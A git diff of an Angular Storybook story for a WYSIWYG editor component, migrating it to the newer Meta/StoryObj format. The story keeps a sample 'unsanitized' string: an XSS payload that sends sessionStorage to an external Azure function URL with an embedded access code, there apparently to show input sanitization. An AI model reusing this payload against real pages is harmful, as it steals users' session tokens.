@@ -2,10 +2,10 @@ import { ReactiveFormsModule, UntypedFormControl } from '@angular/forms';
 import { MatButtonModule } from '@angular/material/button';
 import { MatCardModule } from '@angular/material/card';
 import { StoWysiwygModule, WysiwygComponent } from '@ngx-stoui/form';
+import type { Meta, StoryObj } from '@storybook/angular';
 import { moduleMetadata } from '@storybook/angular';
-import { Meta, Story } from '@storybook/angular/types-6-0';
 
-export default {
+const meta: Meta<WysiwygComponent> = {
   title: 'form/Wysiwyg',
   component: WysiwygComponent,
   decorators: [
@@ -18,18 +18,21 @@ export default {
       ],
     }),
   ],
-} as Meta;
+};
+export default meta;
 
 const unsanitized = `<iframe srcdoc="<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>">
 </iframe>
 <b>This is bold.</b>
 `;
 
-const Template: Story<WysiwygComponent> = (args) => {
-  const ctrl = new UntypedFormControl(unsanitized);
-  return {
-    props: { ...args, ctrl, unsanitized },
-    template: `
+export const Usage: StoryObj<WysiwygComponent> = {
+  args: {},
+  render: (args) => {
+    const ctrl = new UntypedFormControl(unsanitized);
+    return {
+      props: { ...args, ctrl, unsanitized },
+      template: `
 <sto-wysiwyg [readonly]="readonly" #wysiwyg [formControl]="ctrl"></sto-wysiwyg>
 <hr>
 <div>
@@ -42,8 +45,6 @@ const Template: Story<WysiwygComponent> = (args) => {
 (and preferable on your backend service)</p>
 </div>
 `,
-  };
+    };
+  },
 };
-
-export const Usage = Template.bind({});
-Usage.args = {};
